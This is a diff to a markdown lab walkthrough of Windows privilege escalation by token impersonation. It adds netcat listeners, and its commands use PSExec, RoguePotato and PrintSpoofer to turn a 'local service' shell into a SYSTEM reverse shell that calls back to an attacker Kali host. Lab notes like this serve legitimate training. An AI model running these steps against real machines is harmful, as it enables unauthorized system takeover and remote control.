@@ -21,6 +21,8 @@ On Kali, in the same directory as reverse.exe:
 **Kali**
 
 ```
+ss -lptn 'sport = :139'
+kill -9 $PID
 sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
 ```
 
@@ -589,6 +591,8 @@ sudo socat tcp-listen:135,reuseaddr,fork tcp:$VICTIM:9999
 
 Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
 
+<figure><img src="../../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>
+
 **Victim**
 
 ```
@@ -597,82 +601,57 @@ C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.ex
 
 Start another listener on Kali.
 
+**Kali**
+
+```
+rlwrap nc -nvlp 54 
+```
+
 Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
 
-
+**Victim**
 
 ```
-C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+C:\PrivEsc\RoguePotato.exe -r $KALI -e "C:\PrivEsc\reverse.exe" -l 9999
 ```
+
+<figure><img src="../../.gitbook/assets/image (1241).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1244).png" alt=""><figcaption></figcaption></figure>
 
 ## Token Impersonation - PrintSpoofer
 
 Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:\
 
 
+**Kali**
 
+```
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
 
 ```
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 ```
 
+<figure><img src="../../.gitbook/assets/image (1243).png" alt=""><figcaption></figcaption></figure>
+
 Start another listener on Kali.
+
+**Kali**
+
+```
+rlwrap nc -nvlp 54 
+```
 
 Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
 
-
+**Victim**
 
 ```
 C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image (1242).png" alt=""><figcaption></figcaption></figure>
